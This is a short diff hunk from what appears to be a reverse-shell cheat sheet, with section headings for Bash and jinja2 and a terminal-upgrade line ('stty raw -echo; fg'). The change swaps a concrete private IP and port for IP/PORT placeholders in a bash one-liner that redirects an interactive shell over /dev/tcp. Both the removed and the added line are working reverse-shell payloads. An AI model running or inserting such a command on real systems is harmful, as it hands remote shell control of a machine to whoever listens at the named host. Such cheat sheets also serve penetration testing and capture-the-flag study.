@@ -7,7 +7,7 @@ stty raw -echo; fg
 ---
 from Bash
 ```shell
-bash -c "bash -i >& /dev/tcp/10.11.147.65/9000 0>&1"
+bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
 ```
 ---
 for jinja2
